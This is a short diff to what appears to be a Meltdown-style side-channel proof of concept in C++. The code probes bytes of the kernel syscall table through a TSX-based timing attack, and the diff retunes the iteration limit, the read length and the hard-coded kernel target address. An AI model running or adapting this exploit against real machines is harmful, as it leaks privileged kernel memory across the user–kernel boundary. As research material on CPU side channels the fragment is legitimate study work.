@@ -118,7 +118,7 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
     std::array<unsigned long, total_pages> index_heat;
     index_heat.fill(0);
 
-    static constexpr size_t max_useless_iterations = 50000;
+    static constexpr size_t max_useless_iterations = 500;
     size_t useless_iterations = 0;
 
     for (auto r = 0; r < syscall_table_entry_read_retries;) {
@@ -358,8 +358,8 @@ int main(int argc, char** argv) {
     }else
         printf("TSX is supported!\n");
 
-    size_t len = 25;
-    uintptr_t target_address = 0xffffffff812114d1;
+    size_t len = 250;
+    uintptr_t target_address = 0xffffffff81a00200;
 
     auto mem = static_cast<char*>(mmap(nullptr, mem_size(), PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0));
     if (mem == MAP_FAILED) {
